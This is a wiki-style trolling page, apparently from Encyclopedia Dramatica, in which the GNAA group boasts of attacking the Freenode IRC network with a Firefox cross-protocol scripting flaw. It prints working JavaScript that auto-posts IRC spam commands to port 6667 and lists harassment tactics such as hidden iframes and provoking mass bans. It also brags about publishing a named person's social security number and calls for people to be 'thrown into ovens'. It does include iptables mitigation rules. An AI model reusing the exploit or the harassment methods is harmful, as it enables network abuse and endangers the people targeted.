@@ -1,0 +1,132 @@
+Firefox XPS IRC Attack
+[[Image:Goatse security.png|center]]
+<center><font size="5">[http://security.goatse.fr/ GOATSE SECURITY] TEAM 0-DAY EXPLOIT ADVISORY</font></center>
+
+<center>irc.hardchats.com #gnaa to discuss security consulting arrangements</center>
+[[Image:Freenode_spam_header.jpg|right]]
+
+Since it's been copied to much less sweet websites (without credit or sourcing), it's time to write up a security advisory (I believe the publishing of infosec advisories is a first for Encyclopedia Dramatica, [[lulz]]) and let everybody know whats up. [[Firefox]] has a hole in its port blocking scheme that allows a clever [[troll]] to spam an unsuspecting IRC daemon with whatever he desires. The [[GNAA]] leveraged this vulnerability to bring complete ruin upon the [[Freenode]] [[IRC]] network.
+
+==How it works== 
+A new implementation of [http://www.kb.cert.org/vuls/id/476267 cross-protocol scripting] was used to automatically fill a HTTP form to send a POST to port 6667 and shove a bunch of IRC commands down the socket. Although Mozilla [http://www.mozilla.org/projects/netlib/PortBanning.html banned most of the fun ports] years ago, 6667 -- the default port for IRC servers, wasn't on the list. In all likelihood, this the first use of this attack in the wild, ever.
+
+This attack has a lot of implications outside of IRC. Think of all the other TCP ports that are in common use these days that aren't covered in Mozilla's banned list. Most protocols do not use a cookied handshake of any sort to initiate a connection. The sheer amount of potential that exists in turning a web browser into a device speaking an arbitrary protocol is huge. For example, SIP protocol can run on TCP these days. You can make someone's web browser interact with a SIP device. All sorts of potentially criminal and civil liability generating applications. Expect more of them to appear out of the GNAA labs in the future!{{cs|SectionOne|Example source (click plus to uncollapse)|<br><pre><form action="http://irc.freenode.net:6667/" method="post" enctype="text/plain"> 
+<textarea style="display:none" id="x" name="x"></textarea>
+<input type="submit" style="display:none;" />
+</form>
+<script type="text/javascript">
+function randomString(length) {
+        var chars = "abcdefghiklmnopqrstuvwxyz";
+        var randomstring = '';
+        for (var i=0; i<length; i++) {
+                var rnum = Math.floor(Math.random() * chars.length);
+                randomstring += chars.substring(rnum,rnum+1);
+        }
+        return randomstring;
+}
+n=randomString(Math.floor(Math.random()*10+3));
+i=randomString(Math.floor(Math.random()*10+3));
+te=document.getElementById('x');
+te.value = '\nUSER '+i+' 8 * :'+n+'\nNICK '+n+'\nJOIN #freenode\n'+new Array(99).join('PRIVMSG #freenode :Protect your rights online! Do not be squished by the leaders! Support the GNAA at irc.hardchats.com #gnaa ....... My name is '+n+', and I hope you have a nice day.\n');
+te.parentNode.submit()
+</script> </pre>|0}}
+
+==Browser rundown==
+*[[Firefox]] affected, all versions
+*Seamonkey affected, all versions
+*Mozilla suite affected, all versions
+*Possibly others affected
+*[[Microsoft]] [[Internet Explorer]], [[Apple]] Safari '''unaffected'''. [[Truth|Because closed-source commercial products are simply better.]] 
+[[Image:Shouldausedirssi.jpg|thumb|right|Should have used [[Irssi|a real IRC client]].]]
+
+==IRCD rundown==
+*Efnet, no longer affected (took them about an hour to enact countermeasures
+*[[Buttes]]net, no longer affected. (took them about 4 hours to enact countermeaures)
+*OFTC, no longer affected (took them about a day)
+*Freenode, over 1 month to enact countermeasures with a server upgrade from Hyperion to ircd-seven,  after which they immediately got raped by GNAA. (LOL)
+
+==Attack mitigation==
+You'll want to use iptables u32 to skip over the IP and TCP headers of the packet, and match the first 4 bytes of the packet against "POST", like so:
+<pre>-m u32 --u32 0x0>>0x16&0x3c@0xc>>0x1a&0x3c@0x0=0x504f5354 -m recent --set --name lastmeasure --rsource -j DROP</pre>
+One command. Seriously. Any linux machine you can drop in this single line into your iptables configuration and boom, you've stopped the attack. This is what EFnet did. This is what [[Buttes]]net did (which has exactly ONE lazy stoner administrating it). You break out tcpdump, you look at what is going on, you block it in iptables. This is what Freenode could not do, because they don't know anything about anything. Also, you'll want a rule to make sure any subsequent traffic refreshes the drop entry:
+<pre>-m recent --update --seconds 86400 --name lastmeasure --rsource -j DROP</pre>
+
+==Best things that were done to Freenode==
+[[Image:Cause.png|thumb|right|Secret Last Measure IRC flood administration panel]]
+*Embedded exploit in hidden iframes in [[Last Measure|everyone's favorite shock site]], leading to thousands of hosts joining network.
+*Messaged Freenode opers blog links with hidden iframes and watched as they all k-lined eachother
+[[Image:Lolgrowl.jpg|thumb|right|What the attack looks like to a [http://typicalmacintoshuser.com Typical Macintosh User]]]
+[[Image:Effect.jpg|thumb|right|How it appears in the [[irssi|IRC client of rich and beautiful people.]]]]
+*Switched up the floods to CTCP and made users flood themselves off with CTCP replies over and over again until they were k-lined from servers with reconnect limits.
+[[Image:Ctcpklined.png|center]]
+*Flooded freenode with channel names full of legitimate users implying they were troll channels, [http://encyclopediadramatica.com/File:Badchannelbanlol.png making paranoid freenode ops ban their own legitimate users.]
+[[Image:Freenodebigkill2.jpg|thumb|right|You donated previously? [[Retard]].]]
+*After seeing a Freenode staff member make a bot that automatically k-lined flooding users in a channel with wildcards, manually flooded the channel from a shell account and watched it ban an entire TLD, taking a gigantic swath of the network with it.
+[[Image:Freenodebigkill3.jpg|center]]
+[[Image:Freenodebigkill4.jpg|thumb|right|[[K-line]]d *!*@*.net. You know, the usual.]]
+[[Image:Freenodebigkill1.jpg|center]]
+*Made Freenode staff xenophobic and paranoid and watched them k-line anyone who dared ask for assistance or complain about the floods.
+[[Image:Lolklined4reporting.jpg|center]]
+*Making Freenode users self-propagate the link on third party blogging services with warnings to not click the link (we got huge referrals from Twitter, thanks dudes)
+[[Image:Referrals2.jpg|center]]
+[[Image:Referrals1.jpg|center]]
+
+==You are mean. why did you torture freenode so much?==
+[[Image:Ballsinjar.jpg|thumb|right|Also, Freenode users get so mad. That's reason enough alone. [[Lulz]].]]
+Freenode/PDPC is a fucking fraud. In the entire time it has existed, it has never released financial statements. [[Rob Levin]] used PDPC to embezzle hundreds of thousands of dollars which should have been given to open source development projects. He faked his death, and came back in this "christel" incarnation in Europe to continue embezzling from Freenode. It is all a big lie, and these people should be thrown into ovens. EFnet continuously hosts 100x the number of users that Freenode does without constant netsplits and incidents. OFTC does not sit there and continuously beg for money. Get off of Freenode. Go to somewhere that is ethical.
+
+Beyond that, the trolling scene has a lot invested in ruining Freenode. I [http://antisec.wordpress.com/2006/06/27/eyeballing-rob-levin/ posted Rob Levin's social security number], enabling the series of identity thefts and ruins that forced the man to fake his death. With [[Bantown]], I watched Jmax [http://it.slashdot.org/article.pl?sid=06/06/25/1440236 sniff lilo's oper block password] off the wire and absolutely wreck the network in it. I also watched [[Grog]] (of the [[GNAA]] at the time, until he was excommunicated by the former tyrant [[timecop]]) convince lilo that he was the founder of MySQL, get opered up, wreck the network. Then he convinced lilo that his daughter's computer was hacked, apologized, got his o:line back and wrecked the network again. 
+
+In short, wrecking Freenode is a long and glorious troll tradition that stretches backwards for time immemorial. If you associate with Freenode, use Freenode, or support Freenode, you are a target. You are asking to be destroyed.
+
+==See Also==
+*[[Safari XPS Attack]]
+
+==External Links==
+*[http://blog.freenode.net/2010/01/javascript-spam/ Freenode publically admitting they cant figure out iptables, pf, or snort and a simple shell script]
+*[http://www.theregister.co.uk/2010/01/30/firefox_interprotocol_attack/ The Register: ''Firefox-based attack wreaks havoc on IRC users'']
+*[http://news.softpedia.com/news/Firefox-Bug-Used-to-Harass-an-Entire-IRC-Network-133613.shtml Softpedia: ''Firefox Bug Used to Harass Entire IRC Network'']
+*[http://www.irc-junkie.org/2010-03-01/unrealircd-team-releases-patch-against-firefox-xps-attack/ IRC-Junkie: ''UnrealIRCd team releases patch against Firefox XPS Attack'']
+====Non-English sources====
+*[http://teknoloji.milliyet.com.tr/firefox-ile-hack-lediler-/internet/haberdetay/01.02.2010/1193390/default.htm Milliyet, ''Firefox ile hack'lediler!''], Turkish
+*[http://www.xakep.ru/post/50949/default.asp Xakep, ''Эксплоит для бреши в Firefox позволил хакерам внести хаос в работу IRC-сетей''], Russian
+*[http://www.gulli.com/news/firefox-schwachstelle-erm-glicht-angriff-auf-irc-netze-2010-02-01 Gulli, ''Firefox-Schwachstelle ermöglicht Angriff auf IRC-Netze''], German
+*[http://techworld.nl/technologie/16665/bug-in-firefox-gebruikt-tegen-irc-netwerk.html Techworld.nl (IDG), ''Bug in Firefox gebruikt tegen IRC netwerk''], Dutch
+*[http://hup.hu/cikkek/20100130/firefox_xps_bug_a_firefox_sebezhetoseget_kihasznalva_floodoltattak_az_irc_csatornakat Hungarian Unix Portal, ''Firefox XPS bug - a Firefox sebezhetőségét kihasználva floodoltatták az IRC csatornákat''], Hungarian
+*[http://www.azpoint.net/software/sicurezza/18247/Mozilla-bug-manda-in-crisi-Freenode-IRC.asp AZPoint, ''Mozilla: bug manda in crisi Freenode IRC''], Italian
+*[http://www.logiciel.net/une-faille-firefox-utilisee-pour-attaquer-freenode-un-reseau-irc-4864.htm Logiciel, ''Une faille Firefox utilisée pour attaquer Freenode, un réseau IRC''], French
+
+==Wall of whining bloggers==
+[[Image:btweet1.jpg|thumb|right|LOL FREENODE]]
+[[Image:btweet2.jpg|thumb|right|LOL FREENODE]]
+[[Image:btweet3.jpg|thumb|right|LOL FREENODE]]
+[[Image:btweet4.jpg|thumb|right|LOL FREENODE]]
+[[Image:btweet5.jpg|thumb|right|LOL FREENODE]]
+[[Image:btweet6.jpg|thumb|right|LOL FREENODE]]
+[[Image:btweet7.jpg|thumb|right|LOL FREENODE]]
+[[Image:btweet8.jpg|thumb|right|LOL FREENODE]]
+[[Image:btweet9.jpg|thumb|right|LOL FREENODE]]
+[[Image:btweet10.jpg|thumb|right|LOL FREENODE]]
+[[Image:Fntweet3.jpg|center]]
+[[Image:Fntweet2.jpg|center]]
+[[Image:Fntweet1.jpg|center]]
+[[Image:tweet4.jpg|center]]
+[[Image:tweet5.jpg|center]]
+[[Image:tweet6.jpg|center]]
+[[Image:tweet7.jpg|center]]
+[[Image:tweet8.jpg|center]]
+[[Image:tweet9.jpg|center]]
+[[Image:tweet10.jpg|center]]
+[[Image:tweet11.jpg|center]]
+{{haxor}}
+[[Image:tweet12.jpg|center]]
+[[Image:tweet13.jpg|center]]
+[[Image:Gnaa-nostalgia.jpg|thumb|right|Aww, we love you too <3]]
+[[Image:tweet14.jpg|center]]
+
+
+{{ircseries}}
+
+{{Timeline|Featured article March 7, [[2010]]|[[HOW CAN SHE SLAP?!?]]|[[Firefox XPS IRC Attack]]|[[American Family Association]]}}
+
+[[Category:Trolls]][[Category:Softwarez]][[Category:Internets Phenomena]][[Category:Drama-generating techniques]][[Category:2010]]
